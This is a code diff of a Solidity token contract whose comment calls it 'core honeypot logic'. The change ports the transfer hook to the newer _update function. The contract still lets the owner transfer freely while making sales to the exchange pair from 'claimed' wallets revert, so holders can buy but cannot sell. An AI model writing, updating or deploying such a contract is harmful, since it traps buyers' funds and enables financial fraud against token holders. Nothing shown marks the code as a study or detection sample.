@@ -64,19 +64,27 @@ contract ClaimSellBlockedToken is ERC20 {
     }
 
     /// @notice Core honeypot logic
-    function _beforeTokenTransfer(
+    function _update(
         address from,
         address to,
-        uint256
-    ) internal view override {
-        if (from == address(0) || to == address(0)) return;
+        uint256 value
+    ) internal override {
+        if (from == address(0) || to == address(0)) {
+            super._update(from, to, value);
+            return;
+        }
 
         // Owner always allowed
-        if (from == owner) return;
+        if (from == owner) {
+            super._update(from, to, value);
+            return;
+        }
 
         // Block sells from claimed wallets
         if (to == dexPair && claimed[from]) {
             revert("SELL DISABLED: claimed wallet");
         }
+
+        super._update(from, to, value);
     }
 }
